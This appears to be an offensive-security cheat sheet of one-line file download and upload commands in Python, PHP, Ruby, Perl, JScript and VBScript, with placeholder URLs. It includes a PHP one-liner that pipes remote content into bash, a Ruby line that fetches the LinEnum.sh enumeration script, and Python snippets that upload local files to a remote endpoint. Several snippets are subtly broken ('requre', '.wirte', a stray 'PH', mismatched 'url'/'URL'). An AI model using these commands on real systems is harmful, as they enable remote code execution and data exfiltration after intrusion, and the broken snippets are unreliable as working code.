
# Downloading

## Python

### Python 2
```python
python2.7 -c 'import urllib; urllib.urlretrieve ("[Target_File_URL]", "[Output_File]")'
```

### Python 3
```python
python3 -c 'import urllib.request; urllib.request.urlretrieve("[Target_File_URL]", "[Output_File]")'
```


## PHP

### PHP Download with File_get_contents()
```php
php -r '$file = file_get_contents("[Target_File_URL]"); file_put_contents("[Output_File]",$file);'
PH```

### PHP Download with Fopen()
```php
php -r 'const BUFFER = 1024; $fremote = fopen("[Target_File_URL]", "rb"); $flocal = fopen("[Output_File]", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

### PHP Download and Pipe to Bash
```php
php -r '$lines = @file("[Target_File_URL]"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```


## Ruby
```ruby
ruby -e 'requre "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("[Target_File_URL]")))'
```


## Perl
```perl
perl -e 'use LWP::Simple; getstore("[Target_File_URL]", "Output_File");'
```


## JavaScript
### wget.js
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

### Download using JS and cscript.exe
```powershell
cscript.exe /nologo wget.js [Target_File_URL] [Output_File]
```


# VBScript

## wget.vbs
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
	.type = 1
	.open
	.wirte xHttp.responseBody
	.savetofile WScript.Arguments.Item(1), 2
end with
```

### Download using VBScript and cscript.exe
```powershell
cscript.exe /nologo wget.vbs [Target_File_URL] [Output_File]
```


# Uploading

## Python3 uploadserver Module
```python
python3 -m uploadserver
```

### Python One-Liner
```python
python3 -c 'import requests; requests.post("[Target_File_URL]", files= {"files":open("[Input_File]", "rb")})'
```

```python
# Import the requests module
import requests

# Define the target URL where we'll upload the file   ---  http://IP:port/file
URL = "[Target_File_URL]"

# Define the file we want to read, open it, and save it in a variable
file = open("[Input_File]", "rb")

# Use a requests POST request to upload the file
r = requests.post(url,files={"files":file})
```